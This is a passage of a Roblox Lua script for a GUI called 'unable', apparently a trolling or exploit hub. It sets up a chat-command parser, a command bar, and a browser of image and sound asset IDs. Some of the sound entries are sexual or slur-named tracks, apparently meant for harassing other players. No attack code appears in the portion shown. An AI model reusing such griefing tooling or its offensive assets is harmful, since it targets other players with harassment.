unable["list of commands"].ScrollingDirection = Enum.ScrollingDirection.Y

local listPadding = Instance.new("UIPadding")
listPadding.PaddingLeft = UDim.new(0, 4)
listPadding.PaddingTop = UDim.new(0, 4)
listPadding.Parent = unable["list of commands"]

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 0)
layout.Parent = unable["list of commands"]

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	unable["list of commands"].CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)

function populateList(scrollFrame, entries)
	for _, text in ipairs(entries) do
		local line = Instance.new("TextLabel")
		line.Size = UDim2.new(1, -10, 0, 16)
		line.TextColor3 = unable["default border color"]
		line.BackgroundTransparency = 1
		line.Font = Enum.Font.RobotoMono
		line.TextSize = 15
		line.TextScaled = false
		line.Text = text
		line.TextWrapped = false
		line.TextXAlignment = Enum.TextXAlignment.Left
		line.ZIndex = 20
		line.Parent = scrollFrame
	end
end

-------------------------------------------------------------------------------------------------------------------------------

local commands = {}
local prefix = "."
local prefixreq = true
local lastCommandTime = 0
local commandCooldown = 0.2

local txtchatsvc = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService

function addcommand(name, shortname, func)
	commands[string.lower(name)] = func
	if shortname and shortname ~= "" then
		commands[string.lower(shortname)] = func
	end
end

function changeprefix(newprefix)
	if newprefix and newprefix ~= "" then
		prefix = newprefix
		unable["command prefix"].Text = "command prefix: " .. newprefix
	end
end

local function parsecmds(input)
	local cmdgroups = {}
	local currentcmd = {}

	local words = {}
	for word in string.gmatch(input, "[^%s]+") do
		table.insert(words, word)
	end

	for i, word in ipairs(words) do
		if word:sub(1, #prefix) == prefix then
			if #currentcmd > 0 then
				table.insert(cmdgroups, currentcmd)
			end
			currentcmd = {word:sub(#prefix + 1)}
		elseif #currentcmd == 0 then
			currentcmd = {word}
		else
			table.insert(currentcmd, word)
		end
	end

	if #currentcmd > 0 then
		table.insert(cmdgroups, currentcmd)
	end

	return cmdgroups
end

local function execcmd(input)
	local now = tick()
	if now - lastCommandTime < commandCooldown then
		return false
	end

	local cmdgroups = parsecmds(input)

	if prefixreq and #cmdgroups > 1 then
		for _, cmd in ipairs(cmdgroups) do
			local cmdname = string.lower(cmd[1])
			if not commands[cmdname] then
				return false
			end
		end
	end

	local executed = false
	for _, cmd in ipairs(cmdgroups) do
		local cmdname = string.lower(table.remove(cmd, 1))
		if commands[cmdname] then
			commands[cmdname](table.unpack(cmd))
			executed = true
		end
	end

	if executed then
		lastCommandTime = now
	end

	return executed
end

local function onmsg(message, speaker)
	if speaker == game:GetService("Players").LocalPlayer then
		if message:sub(1, #prefix) == prefix then
			execcmd(message)
		end
	end
end

if txtchatsvc then
	game:GetService("TextChatService").OnIncomingMessage = function(message)
		if message.TextSource then
			local speaker = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
			if unable["unlocked"] == true then
				onmsg(message.Text, speaker)
			end
		end
	end
else
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
		if messageData.FromSpeaker == game:GetService("Players").LocalPlayer.Name then
			if unable["unlocked"] == true then
				onmsg(messageData.Message, game:GetService("Players").LocalPlayer)
			end
		end
	end)
end

spawn(updprefixdisplay)

unable["command bar"].Size = UDim2.new(0, 343, 0, 45)
unable["command bar"].Position = UDim2.new(0, 4, 0, 201)

unable["command bar"].BackgroundColor3 = unable["default background color"]
unable["command bar"].BorderColor3 = unable["default border color"]
unable["command bar"].BorderSizePixel = 1
unable["command bar"].ClipsDescendants = true

unable["command bar"].TextColor3 = unable["default border color"]
unable["command bar"].Font = Enum.Font.RobotoMono
unable["command bar"].TextSize = 15
unable["command bar"].TextScaled = false
unable["command bar"].PlaceholderText = "type command here"
unable["command bar"].PlaceholderColor3 = unable["default 1/2 color"]
unable["command bar"].ClearTextOnFocus = true
unable["command bar"].Text = ""
unable["command bar"].TextXAlignment = Enum.TextXAlignment.Center
unable["command bar"].TextYAlignment = Enum.TextYAlignment.Center

unable["command bar text padding"] = Instance.new("UIPadding")
unable["command bar text padding"].PaddingLeft = UDim.new(0, 0)
unable["command bar text padding"].Parent = unable["command bar"]

unable["command bar"].Parent = unable["main frame 1"]
unable["command bar"].ZIndex = 19
unable["command bar"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["execute command button"].Size = UDim2.new(0, 45, 0, 45)
unable["execute command button"].Position = UDim2.new(0, 352, 0, 201)

unable["execute command button"].BackgroundColor3 = unable["default background color"]

unable["execute command button"].BorderColor3 = unable["default border color"]
unable["execute command button"].BorderSizePixel = 1

unable["execute command button"].TextColor3 = unable["default border color"]
unable["execute command button"].Font = Enum.Font.RobotoMono
unable["execute command button"].TextSize = 15
unable["execute command button"].TextScaled = false
unable["execute command button"].Visible = false
unable["execute command button"].Text = ">_"
unable["execute command button"].TextXAlignment = Enum.TextXAlignment.Center
unable["execute command button"].TextYAlignment = Enum.TextYAlignment.Center

unable["execute command button text padding"] = Instance.new("UIPadding")
unable["execute command button text padding"].PaddingLeft = UDim.new(0, 0)
unable["execute command button text padding"].Parent = unable["execute command button"]

unable["execute command button"].Parent = unable["main frame 1"]
unable["execute command button"].ZIndex = 19

local function handle(command, clr)
	if command == "" then
		return
	end

	if clr then
		unable["command bar"].Text = ""
	end

	if not execcmd(command) then
		local words = {}
		for word in string.gmatch(command, "[^%s]+") do
			table.insert(words, word)
		end

		if #words > 0 then
			words[1] = prefix .. words[1]
			execcmd(table.concat(words, " "))
		end
	end
end

unable["execute command button"].MouseButton1Click:Connect(function()
	unable["click sound"]:Play()
	local command = unable["command bar"].Text
	handle(command, false)
end)

unable["command bar"].FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local command = unable["command bar"].Text
		handle(command, true)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["asset ids tab"].Size = UDim2.new(0, 100, 0, 26)
unable["asset ids tab"].Position = UDim2.new(0, 200, 0, 1)

unable["asset ids tab"].BackgroundColor3 = unable["default background color"]

unable["asset ids tab"].BorderColor3 = unable["default border color"]
unable["asset ids tab"].BorderSizePixel = 1

unable["asset ids tab"].TextColor3 = unable["default border color"]
unable["asset ids tab"].Font = Enum.Font.RobotoMono
unable["asset ids tab"].TextSize = 15
unable["asset ids tab"].TextScaled = false
unable["asset ids tab"].Text = "asset IDs"
unable["asset ids tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset ids tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["asset ids tab text padding"] = Instance.new("UIPadding")
unable["asset ids tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["asset ids tab text padding"].Parent = unable["asset ids tab"]

unable["asset ids tab"].Parent = unable["main frame 1"]
unable["asset ids tab"].ZIndex = 19

-------------------------------------------------------------------------------------------------------------------------------

unable["asset id type indicator"].Size = UDim2.new(0, 345, 0, 19)
unable["asset id type indicator"].Position = UDim2.new(0, 28, 0, 32)
unable["asset id type indicator"].BackgroundColor3 = unable["default background color"]
unable["asset id type indicator"].BorderColor3 = unable["default border color"]
unable["asset id type indicator"].BorderSizePixel = 1
unable["asset id type indicator"].TextColor3 = unable["default border color"]
unable["asset id type indicator"].Font = Enum.Font.RobotoMono
unable["asset id type indicator"].TextSize = 15
unable["asset id type indicator"].TextScaled = false
unable["asset id type indicator"].Text = ""
unable["asset id type indicator"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset id type indicator"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset id type indicator text padding"] = Instance.new("UIPadding")
unable["asset id type indicator text padding"].PaddingBottom = UDim.new(0, 1)
unable["asset id type indicator text padding"].Parent = unable["asset id type indicator"]
unable["asset id type indicator"].Parent = unable["main frame 1"]
unable["asset id type indicator"].ZIndex = 19
unable["asset id type indicator"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["switch asset id type button"].Size = UDim2.new(0, 19, 0, 19)
unable["switch asset id type button"].Position = UDim2.new(0, 4, 0, 32)
unable["switch asset id type button"].BackgroundColor3 = unable["default background color"]
unable["switch asset id type button"].BorderColor3 = unable["default border color"]
unable["switch asset id type button"].BorderSizePixel = 1
unable["switch asset id type button"].TextColor3 = unable["default border color"]
unable["switch asset id type button"].Font = Enum.Font.RobotoMono
unable["switch asset id type button"].TextSize = 15
unable["switch asset id type button"].TextScaled = false
unable["switch asset id type button"].Text = "<"
unable["switch asset id type button"].TextXAlignment = Enum.TextXAlignment.Center
unable["switch asset id type button"].TextYAlignment = Enum.TextYAlignment.Center
unable["switch asset id type button"].Parent = unable["main frame 1"]
unable["switch asset id type button"].ZIndex = 20
unable["switch asset id type button"].Visible = false
unable["switch asset id type button text padding"] = Instance.new("UIPadding")
unable["switch asset id type button text padding"].PaddingTop = UDim.new(0, -2)
unable["switch asset id type button text padding"].Parent = unable["switch asset id type button"]

unable["switch asset id type button 2"].Size = UDim2.new(0, 19, 0, 19)
unable["switch asset id type button 2"].Position = UDim2.new(0, 378, 0, 32)
unable["switch asset id type button 2"].BackgroundColor3 = unable["default background color"]
unable["switch asset id type button 2"].BorderColor3 = unable["default border color"]
unable["switch asset id type button 2"].BorderSizePixel = 1
unable["switch asset id type button 2"].TextColor3 = unable["default border color"]
unable["switch asset id type button 2"].Font = Enum.Font.RobotoMono
unable["switch asset id type button 2"].TextSize = 15
unable["switch asset id type button 2"].TextScaled = false
unable["switch asset id type button 2"].Text = ">"
unable["switch asset id type button 2"].TextXAlignment = Enum.TextXAlignment.Center
unable["switch asset id type button 2"].TextYAlignment = Enum.TextYAlignment.Center
unable["switch asset id type button 2"].Parent = unable["main frame 1"]
unable["switch asset id type button 2"].ZIndex = 20
unable["switch asset id type button 2"].Visible = false
unable["switch asset id type button 2 text padding"] = Instance.new("UIPadding")
unable["switch asset id type button 2 text padding"].PaddingTop = UDim.new(0, -2)
unable["switch asset id type button 2 text padding"].Parent = unable["switch asset id type button 2"]

-------------------------------------------------------------------------------------------------------------------------------

unable["asset image 1"].Size = UDim2.new(0, 60, 0, 60)
unable["asset image 1"].Position = UDim2.new(0, 28, 0, 56)
unable["asset image 1"].Image = "rbxassetid://0"
unable["asset image 1"].BackgroundColor3 = unable["default background color"]
unable["asset image 1"].BorderColor3 = unable["default border color"]
unable["asset image 1"].BorderSizePixel = 1
unable["asset image 1"].Parent = unable["main frame 1"]
unable["asset image 1"].ZIndex = 19
unable["asset image 1"].Visible = false

unable["asset image name 1"].Size = UDim2.new(0, 280, 0, 27)
unable["asset image name 1"].Position = UDim2.new(0, 93, 0, 56)
unable["asset image name 1"].BackgroundColor3 = unable["default background color"]
unable["asset image name 1"].BorderColor3 = unable["default border color"]
unable["asset image name 1"].BorderSizePixel = 1
unable["asset image name 1"].TextColor3 = unable["default border color"]
unable["asset image name 1"].Font = Enum.Font.RobotoMono
unable["asset image name 1"].TextSize = 15
unable["asset image name 1"].TextScaled = false
unable["asset image name 1"].Text = "empty"
unable["asset image name 1"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset image name 1"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset image name 1"].Parent = unable["main frame 1"]
unable["asset image name 1"].ZIndex = 19
unable["asset image name 1"].Visible = false
unable["asset image name 1 text padding"] = Instance.new("UIPadding")
unable["asset image name 1 text padding"].PaddingTop = UDim.new(0, -2)
unable["asset image name 1 text padding"].Parent = unable["asset image name 1"]

unable["asset image id 1"].Size = UDim2.new(0, 205, 0, 28)
unable["asset image id 1"].Position = UDim2.new(0, 93, 0, 88)
unable["asset image id 1"].BackgroundColor3 = unable["default background color"]
unable["asset image id 1"].BorderColor3 = unable["default border color"]
unable["asset image id 1"].BorderSizePixel = 1
unable["asset image id 1"].TextColor3 = unable["default border color"]
unable["asset image id 1"].Font = Enum.Font.RobotoMono
unable["asset image id 1"].ClearTextOnFocus = false
unable["asset image id 1"].TextSize = 15
unable["asset image id 1"].TextScaled = false
unable["asset image id 1"].Text = "id: empty"
unable["asset image id 1"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset image id 1"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset image id 1"].Parent = unable["main frame 1"]
unable["asset image id 1"].ZIndex = 19
unable["asset image id 1"].Visible = false
unable["asset image id 1 text padding"] = Instance.new("UIPadding")
unable["asset image id 1 text padding"].PaddingTop = UDim.new(0, -2)
unable["asset image id 1 text padding"].Parent = unable["asset image id 1"]
unable["asset image id 1"].TextEditable = false

unable["copy asset id 1 button"].Size = UDim2.new(0, 70, 0, 28)
unable["copy asset id 1 button"].Position = UDim2.new(0, 303, 0, 88)
unable["copy asset id 1 button"].BackgroundColor3 = unable["default background color"]
unable["copy asset id 1 button"].BorderColor3 = unable["default border color"]
unable["copy asset id 1 button"].BorderSizePixel = 1
unable["copy asset id 1 button"].TextColor3 = unable["default border color"]
unable["copy asset id 1 button"].Font = Enum.Font.RobotoMono
unable["copy asset id 1 button"].TextSize = 15
unable["copy asset id 1 button"].TextScaled = false
unable["copy asset id 1 button"].Text = "copy id"
unable["copy asset id 1 button"].TextXAlignment = Enum.TextXAlignment.Center
unable["copy asset id 1 button"].TextYAlignment = Enum.TextYAlignment.Center
unable["copy asset id 1 button"].Parent = unable["main frame 1"]
unable["copy asset id 1 button"].ZIndex = 19
unable["copy asset id 1 button"].Visible = false
unable["copy asset id 1 button text padding"] = Instance.new("UIPadding")
unable["copy asset id 1 button text padding"].PaddingTop = UDim.new(0, -2)
unable["copy asset id 1 button text padding"].Parent = unable["copy asset id 1 button"]

unable["asset image 2"].Size = UDim2.new(0, 60, 0, 60)
unable["asset image 2"].Position = UDim2.new(0, 28, 0, 121)
unable["asset image 2"].Image = "rbxassetid://0"
unable["asset image 2"].BackgroundColor3 = unable["default background color"]
unable["asset image 2"].BorderColor3 = unable["default border color"]
unable["asset image 2"].BorderSizePixel = 1
unable["asset image 2"].Parent = unable["main frame 1"]
unable["asset image 2"].ZIndex = 19
unable["asset image 2"].Visible = false

unable["asset image name 2"].Size = UDim2.new(0, 280, 0, 27)
unable["asset image name 2"].Position = UDim2.new(0, 93, 0, 121)
unable["asset image name 2"].BackgroundColor3 = unable["default background color"]
unable["asset image name 2"].BorderColor3 = unable["default border color"]
unable["asset image name 2"].BorderSizePixel = 1
unable["asset image name 2"].TextColor3 = unable["default border color"]
unable["asset image name 2"].Font = Enum.Font.RobotoMono
unable["asset image name 2"].TextSize = 15
unable["asset image name 2"].TextScaled = false
unable["asset image name 2"].Text = "empty"
unable["asset image name 2"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset image name 2"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset image name 2"].Parent = unable["main frame 1"]
unable["asset image name 2"].ZIndex = 19
unable["asset image name 2"].Visible = false
unable["asset image name 2 text padding"] = Instance.new("UIPadding")
unable["asset image name 2 text padding"].PaddingTop = UDim.new(0, -2)
unable["asset image name 2 text padding"].Parent = unable["asset image name 2"]

unable["asset image id 2"].Size = UDim2.new(0, 205, 0, 28)
unable["asset image id 2"].Position = UDim2.new(0, 93, 0, 153)
unable["asset image id 2"].BackgroundColor3 = unable["default background color"]
unable["asset image id 2"].BorderColor3 = unable["default border color"]
unable["asset image id 2"].BorderSizePixel = 1
unable["asset image id 2"].TextColor3 = unable["default border color"]
unable["asset image id 2"].Font = Enum.Font.RobotoMono
unable["asset image id 2"].ClearTextOnFocus = false
unable["asset image id 2"].TextSize = 15
unable["asset image id 2"].TextScaled = false
unable["asset image id 2"].Text = "id: empty"
unable["asset image id 2"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset image id 2"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset image id 2"].Parent = unable["main frame 1"]
unable["asset image id 2"].ZIndex = 19
unable["asset image id 2"].Visible = false
unable["asset image id 2 text padding"] = Instance.new("UIPadding")
unable["asset image id 2 text padding"].PaddingTop = UDim.new(0, -2)
unable["asset image id 2 text padding"].Parent = unable["asset image id 2"]
unable["asset image id 2"].TextEditable = false

unable["copy asset id 2 button"].Size = UDim2.new(0, 70, 0, 28)
unable["copy asset id 2 button"].Position = UDim2.new(0, 303, 0, 153)
unable["copy asset id 2 button"].BackgroundColor3 = unable["default background color"]
unable["copy asset id 2 button"].BorderColor3 = unable["default border color"]
unable["copy asset id 2 button"].BorderSizePixel = 1
unable["copy asset id 2 button"].TextColor3 = unable["default border color"]
unable["copy asset id 2 button"].Font = Enum.Font.RobotoMono
unable["copy asset id 2 button"].TextSize = 15
unable["copy asset id 2 button"].TextScaled = false
unable["copy asset id 2 button"].Text = "copy id"
unable["copy asset id 2 button"].TextXAlignment = Enum.TextXAlignment.Center
unable["copy asset id 2 button"].TextYAlignment = Enum.TextYAlignment.Center
unable["copy asset id 2 button"].Parent = unable["main frame 1"]
unable["copy asset id 2 button"].ZIndex = 19
unable["copy asset id 2 button"].Visible = false
unable["copy asset id 2 button text padding"] = Instance.new("UIPadding")
unable["copy asset id 2 button text padding"].PaddingTop = UDim.new(0, -2)
unable["copy asset id 2 button text padding"].Parent = unable["copy asset id 2 button"]

unable["asset image 3"].Size = UDim2.new(0, 60, 0, 60)
unable["asset image 3"].Position = UDim2.new(0, 28, 0, 186)
unable["asset image 3"].Image = "rbxassetid://0"
unable["asset image 3"].BackgroundColor3 = unable["default background color"]
unable["asset image 3"].BorderColor3 = unable["default border color"]
unable["asset image 3"].BorderSizePixel = 1
unable["asset image 3"].Parent = unable["main frame 1"]
unable["asset image 3"].ZIndex = 19
unable["asset image 3"].Visible = false

unable["asset image name 3"].Size = UDim2.new(0, 280, 0, 27)
unable["asset image name 3"].Position = UDim2.new(0, 93, 0, 186)
unable["asset image name 3"].BackgroundColor3 = unable["default background color"]
unable["asset image name 3"].BorderColor3 = unable["default border color"]
unable["asset image name 3"].BorderSizePixel = 1
unable["asset image name 3"].TextColor3 = unable["default border color"]
unable["asset image name 3"].Font = Enum.Font.RobotoMono
unable["asset image name 3"].TextSize = 15
unable["asset image name 3"].TextScaled = false
unable["asset image name 3"].Text = "empty"
unable["asset image name 3"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset image name 3"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset image name 3"].Parent = unable["main frame 1"]
unable["asset image name 3"].ZIndex = 19
unable["asset image name 3"].Visible = false
unable["asset image name 3 text padding"] = Instance.new("UIPadding")
unable["asset image name 3 text padding"].PaddingTop = UDim.new(0, -2)
unable["asset image name 3 text padding"].Parent = unable["asset image name 3"]

unable["asset image id 3"].Size = UDim2.new(0, 205, 0, 28)
unable["asset image id 3"].Position = UDim2.new(0, 93, 0, 218)
unable["asset image id 3"].BackgroundColor3 = unable["default background color"]
unable["asset image id 3"].BorderColor3 = unable["default border color"]
unable["asset image id 3"].BorderSizePixel = 1
unable["asset image id 3"].TextColor3 = unable["default border color"]
unable["asset image id 3"].Font = Enum.Font.RobotoMono
unable["asset image id 3"].ClearTextOnFocus = false
unable["asset image id 3"].TextSize = 15
unable["asset image id 3"].TextScaled = false
unable["asset image id 3"].Text = "id: empty"
unable["asset image id 3"].TextXAlignment = Enum.TextXAlignment.Center
unable["asset image id 3"].TextYAlignment = Enum.TextYAlignment.Center
unable["asset image id 3"].Parent = unable["main frame 1"]
unable["asset image id 3"].ZIndex = 19
unable["asset image id 3"].Visible = false
unable["asset image id 3 text padding"] = Instance.new("UIPadding")
unable["asset image id 3 text padding"].PaddingTop = UDim.new(0, -2)
unable["asset image id 3 text padding"].Parent = unable["asset image id 3"]
unable["asset image id 3"].TextEditable = false

unable["copy asset id 3 button"].Size = UDim2.new(0, 70, 0, 28)
unable["copy asset id 3 button"].Position = UDim2.new(0, 303, 0, 218)
unable["copy asset id 3 button"].BackgroundColor3 = unable["default background color"]
unable["copy asset id 3 button"].BorderColor3 = unable["default border color"]
unable["copy asset id 3 button"].BorderSizePixel = 1
unable["copy asset id 3 button"].TextColor3 = unable["default border color"]
unable["copy asset id 3 button"].Font = Enum.Font.RobotoMono
unable["copy asset id 3 button"].TextSize = 15
unable["copy asset id 3 button"].TextScaled = false
unable["copy asset id 3 button"].Text = "copy id"
unable["copy asset id 3 button"].TextXAlignment = Enum.TextXAlignment.Center
unable["copy asset id 3 button"].TextYAlignment = Enum.TextYAlignment.Center
unable["copy asset id 3 button"].Parent = unable["main frame 1"]
unable["copy asset id 3 button"].ZIndex = 19
unable["copy asset id 3 button"].Visible = false
unable["copy asset id 3 button text padding"] = Instance.new("UIPadding")
unable["copy asset id 3 button text padding"].PaddingTop = UDim.new(0, -2)
unable["copy asset id 3 button text padding"].Parent = unable["copy asset id 3 button"]

-------------------------------------------------------------------------------------------------------------------------------

unable["next page 2 button"].Size = UDim2.new(0, 19, 0, 190)
unable["next page 2 button"].Position = UDim2.new(0, 4, 0, 56)
unable["next page 2 button"].BackgroundColor3 = unable["default background color"]
unable["next page 2 button"].BorderColor3 = unable["default border color"]
unable["next page 2 button"].BorderSizePixel = 1
unable["next page 2 button"].TextColor3 = unable["default border color"]
unable["next page 2 button"].Font = Enum.Font.RobotoMono
unable["next page 2 button"].TextSize = 15
unable["next page 2 button"].TextScaled = false
unable["next page 2 button"].Text = "<"
unable["next page 2 button"].TextXAlignment = Enum.TextXAlignment.Center
unable["next page 2 button"].TextYAlignment = Enum.TextYAlignment.Center
unable["next page 2 button"].Parent = unable["main frame 1"]
unable["next page 2 button"].ZIndex = 20
unable["next page 2 button"].Visible = false
unable["next page 2 button text padding"] = Instance.new("UIPadding")
unable["next page 2 button text padding"].PaddingTop = UDim.new(0, -5)
unable["next page 2 button text padding"].Parent = unable["next page 2 button"]

unable["previous page 2 button"].Size = UDim2.new(0, 19, 0, 190)
unable["previous page 2 button"].Position = UDim2.new(0, 378, 0, 56)
unable["previous page 2 button"].BackgroundColor3 = unable["default background color"]
unable["previous page 2 button"].BorderColor3 = unable["default border color"]
unable["previous page 2 button"].BorderSizePixel = 1
unable["previous page 2 button"].TextColor3 = unable["default border color"]
unable["previous page 2 button"].Font = Enum.Font.RobotoMono
unable["previous page 2 button"].TextSize = 15
unable["previous page 2 button"].TextScaled = false
unable["previous page 2 button"].Text = ">"
unable["previous page 2 button"].TextXAlignment = Enum.TextXAlignment.Center
unable["previous page 2 button"].TextYAlignment = Enum.TextYAlignment.Center
unable["previous page 2 button"].Parent = unable["main frame 1"]
unable["previous page 2 button"].ZIndex = 20
unable["previous page 2 button"].Visible = false
unable["previous page 2 button text padding"] = Instance.new("UIPadding")
unable["previous page 2 button text padding"].PaddingTop = UDim.new(0, -5)
unable["previous page 2 button text padding"].Parent = unable["previous page 2 button"]

local assetData = {
	["image IDs"] = {
		{id = "129909577310669", image = "rbxassetid://129909577310669", name = "team noxious icon"},
		{id = "15960576470", image = "rbxassetid://15960576470", name = "flustered group icon"},
		{id = "18743174443", image = "rbxassetid://18743174443", name = "this thing"},

		{id = "15848332855", image = "rbxassetid://15848332855", name = "scary face 1"},
		{id = "112289855511517", image = "rbxassetid://112289855511517", name = "scary face 2"},
		{id = "15296361385", image = "rbxassetid://15296361385", name = "scary face 3"},

		{id = "6964586710", image = "rbxassetid://6964586710", name = "albert 1"},
		{id = "5279633075", image = "rbxassetid://5279633075", name = "albert 2"},
		{id = "2881590247", image = "rbxassetid://2881590247", name = "albert 3"},

		{id = "158118263", image = "rbxassetid://158118263", name = "c00lkidd"},
		{id = "16432013221", image = "rbxassetid://9422866248", name = "k00pkidd"},
		{id = "17315237983", image = "rbxassetid://17315237983", name = "tubers93"},

		{id = "82967466186087", image = "rbxassetid://82967466186087", name = "unable 1"},
		{id = "131018743284620", image = "rbxassetid://131018743284620", name = "unable 2"},
		{id = "92724155258384", image = "rbxassetid://92724155258384", name = "unable 3"},

		{id = "10658141259", image = "rbxassetid://10658141259", name = "cat 1"},
		{id = "18940114328", image = "rbxassetid://18940114328", name = "cat 2"},
		{id = "18250553522", image = "rbxassetid://18250553522", name = "cat 3"},

		{id = "18597845968", image = "rbxassetid://18597845968", name = "dog 1"},
		{id = "15090485132", image = "rbxassetid://15090485132", name = "dog 2"},
		{id = "13351233318", image = "rbxassetid://13351233318", name = "dog 3"},

		{id = "17673617362", image = "rbxassetid://17673617362", name = "untextured 1"},
		{id = "18293870483", image = "rbxassetid://18293870483", name = "untextured 2"},
		{id = "7072801754", image = "rbxassetid://7072801754", name = "untextured 3"},

		{id = "17601760499", image = "rbxassetid://17601760499", name = "roblox administrator badge"},
		{id = "7866786419", image = "rbxassetid://7866786419", name = "roblox shutdown"},
		{id = "15642855997", image = "rbxassetid://15642855997", name = "dark stretched static"},

		{id = "11458001755", image = "rbxassetid://11458001755", name = "ishowspeed 1"},
		{id = "11428716493", image = "rbxassetid://11428716493", name = "ishowspeed 2"},
		{id = "13027852586", image = "rbxassetid://13027852586", name = "ishowspeed 3"},

		{id = "13839982198", image = "rbxassetid://13839982198", name = "kreekcraft 1"},
		{id = "14207103524", image = "rbxassetid://14207103524", name = "kreekcraft 2"},
		{id = "12030892645", image = "rbxassetid://12030892645", name = "kreekcraft 3"},

		{id = "85312612489831", image = "rbxassetid://85312612489831", name = "shedletsky"},
		{id = "172423468", image = "rbxassetid://172423468", name = "shedletsky 2"},
		{id = "3359602672", image = "rbxassetid://3359602672", name = "shedletsky 3"},

		{id = "131178173049173", image = "rbxassetid://131178173049173", name = "10000x10000 test"},
		{id = "89442759973598", image = "rbxassetid://89442759973598", name = "20000x20000 test"},
		{id = "82751535106374", image = "rbxassetid://82751535106374", name = "30000x30000 test"},
	},
	["sound IDs"] = {
		{id = "76578817848504", name = "unable's theme"},
		{id = "1839247124", name = "c00lkidd's theme"},
		{id = "1839246711", name = "c00lkidd's theme (extended)"},

		{id = "688596285", name = "man crying"},
		{id = "7014161416", name = "woman crying"},
		{id = "7046088029", name = "robot rock loop"},

		{id = "16190757458", name = "skibidi fanum tax"},
		{id = "70474732190723", name = "axxo beat"},
		{id = "113568851878579", name = "mangos funk (pitch 0.15)"},

		{id = "7999878400", name = "phonk 1"},
		{id = "7601924770", name = "phonk 2"},
		{id = "7764635032", name = "phonk 3"},

		{id = "7644757406", name = "arabic audio"},
		{id = "6025999413", name = "whats 9 + 10"},
		{id = "5196850360", name = "schnek"},

		{id = "5672354144", name = "packing"},
		{id = "132760245482684", name = "you diggin in me"},
		{id = "111281710445018", name = "palm tree funk"},

		{id = "8031609997", name = "pornhub intro"},
		{id = "5854877338", name = "want a break from the ads?"},
		{id = "8119768185", name = "bing chilling"},

		{id = "9059013830", name = "why this game so fun chat"},
		{id = "9074555470", name = "they need to die"},
		{id = "9059015332", name = "man what the f"},

		{id = "5228173823", name = "gangsta paradise loop remix"},
		{id = "3200130016", name = "you are an idiot"},
		{id = "4809574295", name = "fart"},

		{id = "85833437298815", name = "smezir"},
		{id = "73154534382655", name = "lieu - drain"},
		{id = "104458998006537", name = "sesame street beat"},

		{id = "133898039428349", name = "who made that mess"},
		{id = "81044979151859", name = "kick that ninja bitch off the plane!!!"},
		{id = "98238687813546", name = "teach me"},

		{id = "133848133672814", name = "fire ass rap"},
		{id = "127524384782205", name = "fire ass rap 2"},
		{id = "70972281874046", name = "fire ass rap 3"},

		{id = "80400333771829", name = "no reason flipp"},
		{id = "112612337031675", name = "fire ass sigilcore song"},
		{id = "137810810144422", name = "100 hours"},

		{id = "128900322878891", name = "drillbeat"},
		{id = "86471321003271", name = "hardstyle with static"},
		{id = "79744099014827", name = "foreign with static"},

		{id = "77505226120358", name = "sex scene 1"},
		{id = "83877924327587", name = "sex scene 2"},
		{id = "103693997292954", name = "cause im bussing"},

		{id = "88723844725910", name = "cooking with kya"},
		{id = "70386399207262", name = "insomnia999"},
		{id = "125865426218084", name = "call me a good boy"},

		{id = "111092240241909", name = "hard ass jumpstyle"},
		{id = "91301048841024", name = "1 pound fish tokold"},
		{id = "18841896412", name = "hardstyle"},

		{id = "133828158357528", name = "foreign - lungskull"},
		{id = "88064647826500", name = "congo funk"},
		{id = "117764575764380", name = "people who annoy you"},

		{id = "85911347599135", name = "twice n word"},
		{id = "123619245101939", name = "its going down now"},
		{id = "72027622680443", name = "you are pressed - lieu (pitch 3.36)"},

		{id = "103279424412425", name = "astra - krezus"},
		{id = "96762704171712", name = "snickers"},
		{id = "117562011395992", name = "brazilian funk"},

		{id = "78527071535561", name = "!? - lungskull instrumental"},
		{id = "75038862482887", name = "montagem dimensao"},
		{id = "98731775607694", name = "skibidi dop dop dop yes yes"},

		{id = "91922658560009", name = "bodypartz instrumental"},
		{id = "84079943291779", name = "minecraft funk"},
		{id = "92086395940466", name = "yes king"},

		{id = "93300439155773", name = "hentai noises"},
		{id = "79494113906358", name = "toby smiles"},
		{id = "118898127559047", name = "WHO IS GOD!?!?!"},

		{id = "90124981325233", name = "clapping noises???"},
		{id = "110733237958023", name = "fuck me"},
		{id = "94356638905764", name = "ambasing"},

		{id = "18599504383", name = "bumpin that"},
		{id = "138478944413457", name = "met you party"},
		{id = "110472251959955", name = "eviljordan"},

		{id = "135844480028738", name = "king owns"},
		{id = "91256110982700", name = "till you use your mind"},
		{id = "106130561648076", name = "listen listen listen"},

		{id = "107537681782154", name = "stretchin"},
		{id = "75069501268805", name = "gimme that dih"},
		{id = "71960165966376", name = "ohh shit"},

		{id = "104387056593435", name = "its getting harder"},
		{id = "103232206651699", name = "gargling???"},
		{id = "94104195286244", name = "kiss of life"},

		{id = "110306698850969", name = "i dont like ninjas"},
		{id = "118730057421267", name = "trench boy"},
		{id = "104789232753644", name = "forgot the name"},

		{id = "9774647115329", name = "comet"},
		{id = "124176387786425", name = "teach me full"},
		{id = "138695457024163", name = "ninja!!"},

		{id = "130262136847701", name = "chicken jockey"},
		{id = "89760217888895", name = "i am steve"},
